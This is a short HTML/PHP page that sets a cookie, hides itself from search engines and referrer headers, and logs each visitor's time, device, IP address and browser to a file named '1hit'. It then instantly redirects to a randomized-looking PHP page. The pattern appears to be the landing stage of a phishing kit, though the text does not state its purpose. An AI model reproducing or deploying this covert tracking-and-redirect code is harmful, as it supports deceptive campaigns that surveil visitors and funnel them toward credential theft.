<html>
<head>
<meta name="referrer" content="no-referrer" />
<meta name="robots" content="noindex, nofollow"/>
<script type="text/javascript" language="javascript">document.cookie = "we=meat";</script>
<?php
require 'call.php';
$time = gmdate ("H:i:s");
$file=fopen("1hit","a+"); 
          fwrite($file,$time . "#" . $device ."#". $ip . "#" . $browser. "\r\n");
fclose($file);

print '<meta http-equiv="refresh" content="0; url=' . 'b-mver1945882.php?' . $string . '"></head></html>';
?>
</head>
</html>